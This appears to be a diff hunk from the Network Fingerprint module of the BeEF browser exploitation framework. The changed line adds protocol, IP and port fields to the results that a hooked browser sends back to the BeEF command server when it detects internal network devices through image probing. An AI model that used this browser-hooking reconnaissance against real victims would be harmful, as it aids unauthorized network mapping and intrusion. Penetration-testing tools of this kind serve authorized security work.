@@ -244,7 +244,7 @@ beef.execute(function() {
     img.onerror = function() { dom.removeChild(this); }
     img.onload = function() {
       if (this.width == urls[this.id][5] && this.height == urls[this.id][6]) {
-        beef.net.send('<%= @command_url %>', <%= @command_id %>,'discovered='+signature_name+"&url="+escape(this.src));dom.removeChild(this);
+        beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto='+proto+'&ip='+ip+'&port='+port+'&discovered='+signature_name+"&url="+escape(this.src));dom.removeChild(this);
         beef.debug("[Network Fingerprint] Found [" + signature_name + "] with URL [" + escape(this.src) + "]");
       }
     }
